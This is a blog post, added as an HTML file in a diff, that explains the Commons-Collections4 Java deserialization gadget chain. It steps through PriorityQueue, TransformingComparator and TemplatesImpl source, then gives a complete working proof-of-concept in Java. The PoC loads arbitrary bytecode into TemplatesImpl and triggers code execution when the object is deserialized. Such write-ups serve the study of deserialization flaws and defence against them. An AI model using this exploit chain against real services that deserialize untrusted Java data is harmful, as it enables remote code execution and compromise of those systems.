@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Commons-Collections4 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="CommonsCollections 4.0
+JDK 版本暂无限制
+需要 javassist(伪条件)
+
+调用链：
+PriorityQueue.readObject()
+  PriorityQueue.heapify()
+  Priorit..." />
+    <meta name="keywords" content="cc,java,反序列化" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Commons-Collections4</h2>
+            <div class="post-date">2022-11-19</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/commons-collections4.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p>CommonsCollections 4.0<br>
+JDK 版本暂无限制<br>
+需要 javassist(伪条件)</p>
+<!-- more -->
+<p><strong>调用链：</strong></p>
+<pre><code>PriorityQueue.readObject()
+  PriorityQueue.heapify()
+  PriorityQueue.siftDown()
+  PriorityQueue.siftDownUsingComparator()
+  comparator.compare() === TransformingComparator.compare()
+    ChainedTransformer.transform()
+      ConstantTransformer.transform()
+      InstantiateTransformer.transform()
+      newInstance()
+        TrAXFilter#TrAXFilter()
+          TemplatesImpl.newTransformer()
+            TemplatesImpl.getTransletInstance() 
+              TemplatesImpl.defineTransletClasses() 
+</code></pre>
+<p>CC4 是 在CC2 的基础上，使用<code>InstantiateTransformer</code>类替代<code>InvokerTransformer</code>类来实例化 <code>TrAXFilter</code>，通过<code>TrAXFilter#TrAXFilter</code>方法调用<code>templates#newTransformer()（templates为构造好的TemplatesImpl）</code>进行加载任意字节码（任意代码执行）。<br>
+在调用链中<code>ChainedTransformer#transform()</code>以下部分的调用链和之前的CC3相同，因此我们从<code>ChainedTransformer#transform()</code>入手。</p>
+<h1 id="priorityqueue链">PriorityQueue链</h1>
+<p>首先来到<code>ChainedTransformer#transform()</code>，我们需要找到一个新的可以反序列化的类，且该类中调用了<code>transform()</code>方法。此处使用的是<code>TransformingComparator</code>类，它的<code>compare()</code>方法中调用了<code>transform()</code>方法。</p>
+<h1 id="transformingcomparator">TransformingComparator</h1>
+<p><strong>TransformingComparator#compare()</strong></p>
+<pre><code>public int compare(final I obj1, final I obj2) {
+        final O value1 = this.transformer.transform(obj1);
+        final O value2 = this.transformer.transform(obj2);
+        return this.decorated.compare(value1, value2);
+    }
+</code></pre>
+<p>此处<code>transformer</code>可控,初始化时传参（transformer为ChainedTransformer）</p>
+<pre><code>public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,
+                                  final Comparator&lt;O&gt; decorated) {
+        this.decorated = decorated;
+        this.transformer = transformer;
+    }
+</code></pre>
+<p>然后查找何处调用了compare()方法，最好是在某处重写了<code>readObject()</code>方法的类中。这里为<code>PriorityQueue</code>类。</p>
+<h1 id="priorityqueue">PriorityQueue</h1>
+<p><strong>PriorityQueue#siftUpUsingComparator()</strong><br>
+在<code>PriorityQueue#siftDownUsingComparator()</code>方法中调用了<code>compare()方法</code>。</p>
+<pre><code>private void siftDownUsingComparator(int k, E x) {
+        int half = size &gt;&gt;&gt; 1;
+        while (k &lt; half) {
+            int child = (k &lt;&lt; 1) + 1;
+            Object c = queue[child];
+            int right = child + 1;
+            if (right &lt; size &amp;&amp;
+                comparator.compare((E) c, (E) queue[right]) &gt; 0)
+                c = queue[child = right];
+            if (comparator.compare(x, (E) c) &lt;= 0)
+                break;
+            queue[k] = c;
+            k = child;
+        }
+        queue[k] = x;
+    }
+</code></pre>
+<p>此处的<code>comparator</code>为初始化时传入的参数，是可控的。<br>
+<strong>PriorityQueue#PriorityQueue()</strong></p>
+<pre><code>public PriorityQueue(int initialCapacity,
+                         Comparator&lt;? super E&gt; comparator) {
+        // Note: This restriction of at least one is not actually needed,
+        // but continues for 1.5 compatibility
+        if (initialCapacity &lt; 1)
+            throw new IllegalArgumentException();
+        this.queue = new Object[initialCapacity];
+        this.comparator = comparator;
+    }
+</code></pre>
+<p><strong>PriorityQueue#siftDown()</strong><br>
+在<code>PriorityQueue#siftDown()</code>方法中调用了<code>PriorityQueue#PriorityQueue()</code></p>
+<pre><code>private void siftDown(int k, E x) {
+        if (comparator != null)
+            siftDownUsingComparator(k, x);
+        else
+            siftDownComparable(k, x);
+    }
+</code></pre>
+<p><strong>PriorityQueue#heapify()</strong><br>
+来到<code>PriorityQueue#heapify()</code>在该方法中调用了<code>PriorityQueue#siftDown()</code>方法。而该方法又在<code>PriorityQueue#readObject()</code>被调用，然后反序列化我们构造好的<code>PriorityQueue</code>类。</p>
+<pre><code>private void heapify() {
+        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
+            siftDown(i, (E) queue[i]);
+    }
+</code></pre>
+<p>此处对size进行了右移一位的操作然后再减一，只有当i大于0时才进入for循环内。size为<code>PriorityQueue的成员</code>可反射修改，或使用<code>PriorityQueue#add()</code>但是<code>add()</code>方法会在序列化时就本地执行一次字节码。因为<code>add()</code>方法最后也会到<code>TransformingComparator#compare()</code>。<br>
+和之前其他链的处理相同，在add之前改掉某类的值(此处为ChainedTransformer)然后再序列化之前通过反射将值改回原值。<br>
+<strong>PriorityQueue#readObject()</strong></p>
+<pre><code>private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in size, and any hidden stuff
+        s.defaultReadObject();
+
+        // Read in (and discard) array length
+        s.readInt();
+
+        queue = new Object[size];
+
+        // Read in all elements.
+        for (int i = 0; i &lt; size; i++)
+            queue[i] = s.readObject();
+
+        // Elements are guaranteed to be in &quot;proper order&quot;, but the
+        // spec has never explained what that might be.
+        heapify();
+    }
+</code></pre>
+<h1 id="poc">poc</h1>
+<pre><code>package Cc4;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.PriorityQueue;
+
+public class Cc4 {
+    public static void main(String[] args) throws Exception {
+        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\class\\&quot;,&quot;Temp.class&quot;));
+        Templates obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_name&quot;, &quot;notnull&quot;);
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer[] transformers = {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj})
+        };
+
+        Transformer[] fucktransformers = {new ConstantTransformer(1)};
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(fucktransformers);
+
+        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);
+        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+//        通过add方法来修改size
+//        priorityQueue.add(1);
+//        priorityQueue.add(1);
+//      通过反射来修改size
+        Field iTransformers1 = priorityQueue.getClass().getDeclaredField(&quot;size&quot;);
+        iTransformers1.setAccessible(true);
+        iTransformers1.set(priorityQueue,4);
+
+        Field iTransformers = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
+
+        serialize(priorityQueue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+    public static void setFieldValue(Object obj,String name,Object value) throws Exception {
+        Field f = obj.getClass().getDeclaredField(name);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+}
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://dydydy123.github.io/tag/H2OnWZra8/" class="tag">
+                    cc
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/-DwzpURo7/" class="tag">
+                    java
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/OtQMAvCGr3/" class="tag">
+                    反序列化
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/commons-collections3/">
+                  <h3 class="post-title">
+                    Commons-Collections3
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
